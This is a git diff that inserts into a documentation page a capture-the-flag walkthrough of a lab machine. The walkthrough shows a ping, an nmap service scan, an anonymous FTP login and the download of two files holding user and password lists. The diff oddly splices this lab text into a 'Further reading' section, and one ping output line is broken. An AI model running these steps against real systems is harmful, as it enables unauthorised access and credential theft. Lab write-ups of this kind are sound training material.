@@ -18,23 +18,23 @@ Making a Change.
 
 ## Further reading
 
-```
-Read [about how-to guides](https://diataxis.fr/how-to-guides/) in the Diátaxis framework
-PING
+Crocodile is a very easy Linux machine which showcases the dangers of misconfigured authentication and sensitive data exposure. A vulnerable FTP server instance is misconfigured to allow anonymous authentication and upon enumerating the server, sensitive files can be found containing cleartext credentials. **Enumerating** and **fuzzing** the website will reveal a **hidden login endpoint** where the previously acquired credentials can be used to gain access to the admin panel.
 
+**PING**
+```
 ┌─odaj@parrot
 └──╼ $ping -c4 10.129.1.15
 PING 10.129.1.15 (10.129.1.15) 56(84) bytes of data.
 64 bytes from 10.129.1.15: icmp_seq=1 ttl=63 time=132 ms
 64 bytes from 10.129.1.15: icmp_seq=2 ttl=63 time=157 ms
-64 bytes from 10.129.1.15: icmp_seq=3 ttl=63 time=181 ms
+64 bytes from 10.129.1.
+15: icmp_seq=3 ttl=63 time=181 ms
 64 bytes from 10.129.1.15: icmp_seq=4 ttl=63 time=265 ms
 ```
 
-**NMAP SCAN**
+**NMAP SCAN on the target**
 
 ```
-
 ┌─[odaj@parrot]─[~/Downloads]
 └──╼ $nmap -sC -sV 10.129.1.15
 Starting Nmap 7.95 ( https://nmap.org ) at 2026-08-22 15:03 IDT
@@ -66,4 +66,103 @@ Service Info: OS: Unix
 
 Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
 Nmap done: 1 IP address (1 host up) scanned in 71.68 seconds
+```
+Once services have been detected using, we proceed with testing each service to see what information can be gathered further
+
+**FTP Service**
+```
+┌─[✗]─[odaj@parrot]─[~/Downloads]
+└──╼ $ftp -?
+usage: ftp [-46AadefginpRtVv] [-N NETRC] [-o OUTPUT] [-P PORT] [-q QUITTIME]
+[-r RETRY] [-s SRCADDR] [-T DIR,MAX[,INC]] [-x XFERSIZE]
+[[USER@]HOST [PORT]]
+[[USER@]HOST:[PATH][/]]
+[file:///PATH]
+[ftp://[USER[:PASSWORD]@]HOST[:PORT]/PATH[/][;type=TYPE]]
+[http://[USER[:PASSWORD]@]HOST[:PORT]/PATH]
+[https://[USER[:PASSWORD]@]HOST[:PORT]/PATH]
+...
+ftp -u URL FILE ...
+ftp -?
+-4            Only use IPv4 addresses
+-6            Only use IPv6 addresses
+-A            Force active mode
+-a            Use anonymous login
+-d            Enable debugging
+-e            Disable command-line editing
+-f            Force cache reload for FTP or HTTP proxy transfers
+-g            Disable file name globbing
+-i            Disable interactive prompt during multiple file transfers
+-N NETRC      Use NETRC instead of ~/.netrc
+-n            Disable auto-login
+-o OUTPUT     Save auto-fetched files to OUTPUT
+-P PORT       Use port PORT
+-p            Force passive mode
+-q QUITTIME   Quit if connection stalls for QUITTIME seconds
+-R            Restart non-proxy auto-fetch
+-r RETRY      Retry failed connection attempts after RETRY seconds
+-s SRCADDR    Use source address SRCADDR
+-t            Enable packet tracing
+-T DIR,MAX[,INC]
+Set maximum transfer rate for direction DIR to MAX bytes/s,
+with optional increment INC bytes/s
+-u URL        URL to upload file arguments to
+-V            Disable verbose and progress
+-v            Enable verbose and progress
+-x XFERSIZE   Set socket send and receive size to XFERSIZE
+-?            Display this help and exit
+ ```
+
+Now we login as anynomous
+```
+┌─[odaj@parrot]─[~/Downloads]
+└──╼ $ftp -a 10.129.1.15
+Connected to 10.129.1.15.
+220 (vsFTPd 3.0.3)
+230 Login successful.
+Remote system type is UNIX.
+Using binary mode to transfer files.
+```
+
+Nice, we are here, and we see two attracting files
+```
+ftp> ls
+229 Entering Extended Passive Mode (|||43508|)
+150 Here comes the directory listing.
+-rw-r--r--    1 ftp      ftp            33 Jun 08  2021 allowed.userlist
+-rw-r--r--    1 ftp      ftp            62 Apr 20  2021 allowed.userlist.passwd
+226 Directory send OK.
+```
+
+Tranfering the files.
+```
+ftp> get allowed.userlist
+Not connected.
+ftp> get allowed.userlist.passwd
+Not connected.
+ftp> open 10.129.1.15
+Connected to 10.129.1.15.
+220 (vsFTPd 3.0.3)
+230 Login successful.
+Remote system type is UNIX.
+Using binary mode to transfer files.
+ftp> get allowed.userlist.passwd
+local: allowed.userlist.passwd remote: allowed.userlist.passwd
+229 Entering Extended Passive Mode (|||47924|)
+150 Opening BINARY mode data connection for allowed.userlist.passwd (62 bytes).
+100% |***********************************************************************************************************************************************************************************************|    62      441.94 KiB/s    00:00 ETA
+226 Transfer complete.
+62 bytes received in 00:00 (0.29 KiB/s)
+ftp> get allowed.userlist
+local: allowed.userlist remote: allowed.userlist
+229 Entering Extended Passive Mode (|||44141|)
+150 Opening BINARY mode data connection for allowed.userlist (33 bytes).
+100% |***********************************************************************************************************************************************************************************************|    33      236.95 KiB/s    00:00 ETA
+226 Transfer complete.
+33 bytes received in 00:00 (0.15 KiB/s)
+ftp>
+
+
+ftp> exit
+221 Goodbye.
 ```
